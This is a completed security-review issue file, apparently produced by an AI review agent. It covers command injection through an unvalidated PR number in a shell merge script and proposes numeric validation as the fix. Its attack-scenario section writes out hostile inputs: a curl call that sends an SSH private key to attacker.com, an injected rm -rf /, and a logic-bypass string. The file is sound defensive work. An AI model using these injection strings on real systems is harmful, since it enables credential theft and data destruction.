---
status: completed
priority: p0
issue_id: "002"
tags: [code-review, security, pr-101, input-validation]
dependencies: []
completed_date: 2025-10-16
---

# Missing Input Validation on PR Number

## Problem Statement

The `workflow-merge.sh` script accepts PR numbers from user input without any validation, allowing injection of shell metacharacters and malicious commands. This creates a critical security vulnerability when combined with the eval-based command execution pattern.

**CVSS Score:** 8.6 (High)
**CWE:** CWE-20 (Improper Input Validation)

## Findings

- Discovered during comprehensive security review by security-sentinel agent
- Location: `scripts/workflow-merge.sh:66, 190-240`
- No validation on user-supplied PR numbers
- Allows arbitrary input including shell metacharacters
- Combined with eval usage (Issue #001), enables command injection
- PR numbers flow directly into shell commands via GitHub CLI

### Vulnerable Code
```bash
# In parse_arguments() function
*)
    PR_NUMBER="$1"  # ← NO VALIDATION - accepts ANY string
    shift
    ;;

# Later used in commands without sanitization
pr_data=$(gh pr view "$PR_NUMBER" --json number,title,author,state)
pr_from_issue=$(gh pr list --search "$issue_number in:title" ...)
```

### Attack Scenarios

**Scenario 1: Command Injection via PR Number**
```bash
./workflow-merge.sh "123; curl https://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"
# Becomes: gh pr view "123; curl https://..."
# Executes attacker's command
```

**Scenario 2: Shell Metacharacter Exploitation**
```bash
./workflow-merge.sh "123$(rm -rf /)"
# Command substitution executed before gh CLI call
```

**Scenario 3: Logic Bypass**
```bash
./workflow-merge.sh "0 OR 1=1"
# May bypass validation checks in later logic
```

## Proposed Solutions

### Option 1: Strict Numeric Validation (Recommended)
- **Pros**: Simple, effective, blocks all non-numeric input, aligns with GitHub PR numbering
- **Cons**: None
- **Effort**: Small (30 minutes)
- **Risk**: Low - Well-understood validation pattern

**Implementation:**
```bash
parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            # ... flag handling ...
            *)
                # SECURE: Validate PR number is numeric only
                if [[ "$1" =~ ^[0-9]+$ ]]; then
                    # Additional check: reasonable length
                    if [[ ${#1} -gt 10 ]]; then
                        print_error "PR number too long: $1"
                        exit 1
                    fi
                    PR_NUMBER="$1"
                else
                    print_error "Invalid PR number: $1 (must contain only digits)"
                    print_info "Example: /merge 123"
                    exit 1
                fi
                shift
                ;;
        esac
    done
}

# Add dedicated validation function
validate_pr_number() {
    if [[ -z "$PR_NUMBER" ]]; then
        print_error "PR number is required"
        return 1
    fi

    if [[ ! "$PR_NUMBER" =~ ^[0-9]+$ ]]; then
        print_error "PR number must contain only digits: $PR_NUMBER"
        return 1
    fi

    if [[ ${#PR_NUMBER} -gt 10 ]]; then
        print_error "PR number suspiciously long (max 10 digits)"
        return 1
    fi

    # Additional check: PR number should be positive
    if [[ "$PR_NUMBER" -eq 0 ]]; then
        print_error "PR number must be greater than 0"
        return 1
    fi

    return 0
}

# Call validation in main flow
main() {
    parse_arguments "$@"
    validate_pr_number || exit 1
    # ... rest of workflow ...
}
```

### Option 2: GitHub API Validation (Defense in Depth)
- **Pros**: Verifies PR actually exists, double validation
- **Cons**: Adds network latency, requires API call before other operations
- **Effort**: Medium (1 hour including error handling)
- **Risk**: Low - But doesn't replace input validation

**Implementation:**
```bash
validate_pr_exists() {
    local pr_number="$1"

    # Input validation first (always)
    [[ ! "$pr_number" =~ ^[0-9]+$ ]] && return 1

    # Verify PR exists via API
    if ! gh pr view "$pr_number" --json number >/dev/null 2>&1; then
        print_error "PR #$pr_number not found"
        return 1
    fi

    return 0
}
```

## Recommended Action

**Option 1: Strict Numeric Validation** - This is the minimum required security control.

**Additional Recommendation:** Implement Option 2 as well for defense-in-depth, but Option 1 is mandatory.

### Implementation Steps
1. Add regex validation to `parse_arguments()` function
2. Create `validate_pr_number()` helper function
3. Add validation call in `main()` before any operations
4. Update argument parsing error messages
5. Test with various invalid inputs:
   - Empty string
   - Alphabetic characters
   - Shell metacharacters (; | & $ ` \)
   - Command substitution attempts
   - Very long numbers (>10 digits)
   - Zero and negative numbers

## Technical Details

**Affected Files:**
- `scripts/workflow-merge.sh` (lines 66, 190-240)

**Related Components:**
- PR inference logic (`infer_pr_number()`)
- All GitHub CLI commands using `$PR_NUMBER`
- Issue number extraction from branch names

**Database Changes:** None

## Resources

- Code review PR: https://github.com/carmandale/agent-os/pull/101
- Related security issue: Command injection (Issue #001)
- OWASP Input Validation Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
- CWE-20: https://cwe.mitre.org/data/definitions/20.html

## Acceptance Criteria

- [ ] PR number validation added to `parse_arguments()` with regex `^[0-9]+$`
- [ ] Maximum length check prevents overflow attacks (10 digit limit)
- [ ] Minimum value check rejects zero and negative numbers
- [ ] Dedicated `validate_pr_number()` function created
- [ ] Clear error messages for invalid input with usage examples
- [ ] Validation called before any PR operations
- [ ] All test cases pass:
  - [ ] Valid numeric PR number accepted
  - [ ] Alphabetic characters rejected
  - [ ] Shell metacharacters rejected
  - [ ] Command substitution syntax rejected
  - [ ] Empty string rejected
  - [ ] Very long numbers rejected
- [ ] Integration test: Attempt exploit with malicious input (should fail safely)

## Work Log

### 2025-10-15 - Code Review Discovery
**By:** Claude Code Review System (security-sentinel agent)
**Actions:**
- Discovered during comprehensive multi-agent security review of PR #101
- Analyzed input validation patterns across all user-supplied inputs
- Categorized as P0 blocking issue due to command injection risk
- Created todo for tracking and resolution

**Learnings:**
- Input validation is the first line of defense against injection attacks
- PR numbers should be strictly validated as unsigned integers
- Agent OS scripts should validate all user input before use
- Validation should happen as early as possible in the execution flow
- Clear error messages help prevent user confusion

## Notes

**BLOCKING:** This issue MUST be resolved before PR #101 can be merged to main.

**Priority Justification:** Without input validation, the command injection vulnerability (Issue #001) is trivially exploitable. These two issues work together to create a critical security gap.

**Context:** Part of comprehensive security review that identified 3 critical, 7 high, 8 medium, and 6 low severity issues in the `/merge` command implementation.

**Related Findings:**
- Issue #001: Command injection via eval (P0) - This issue makes that exploitable
- Issue #003: Path traversal in worktree operations (P0)
- Future work: Validate merge strategy parameter, branch names

Source: Code review performed on 2025-10-15
Review command: `/compounding-engineering:review PR #101`
